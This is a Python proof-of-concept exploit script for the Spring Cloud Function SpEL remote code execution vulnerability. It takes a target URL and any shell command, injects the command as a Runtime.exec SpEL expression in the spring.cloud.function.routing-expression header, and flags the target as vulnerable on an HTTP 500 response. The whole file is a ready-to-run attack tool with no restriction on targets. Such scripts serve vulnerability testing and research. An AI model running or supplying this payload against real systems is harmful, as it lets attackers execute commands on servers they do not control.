# !/usr/bin/env/python3
# _*_coding:utf-8_*_
# @__Data__:2022-03-28
# @__Auther__:lalone
# @__PythonVersion__:python3
# @__name__:spring_cloud_function_SPEL.py

import argparse
import requests

# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Spring Cloud Function SpEL RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://github.com/cckuailong/spring-cloud-function-SpEL-RCE", 
            "https://hosch3n.github.io/2022/03/26/SpringCloudFunction%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/", 
            "https://github.com/spring-cloud/spring-cloud-function/commit/dc5128b80c6c04232a081458f637c81a64fa9b52", 
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "https://github.com/cckuailong/spring-cloud-function-SpEL-RCE"
        },
        "tags": ["springcloud", "rce", "spel"],
    }


def poc(url, shell):
    try:
        url = format_url(url)

        path = """/xxx"""
        data = "xxx"
        headers = {
            'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("{shell}")'.format(shell=shell),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        resp = requests.post(url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp.status_code == 500:
            print(url + "has vul")

    except:
        print("target is not vulnerable")

def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def main():
    parser = argparse.ArgumentParser(prog="spring_cloud_function_SPEL",description="Spring Cloud Function SpEL RCE")
    parser.add_argument("url", type=str, help="URL")
    parser.add_argument("-s", "--shell", type=str, help="执行语句", default="id")
    args = parser.parse_args()
    print(">>> url: " + args.url)
    print(">>> payload: " + args.shell)
    poc(args.url, args.shell)


if __name__ == "__main__":
  # url = input("检测目标：")
  # poc(url, shell)
  main()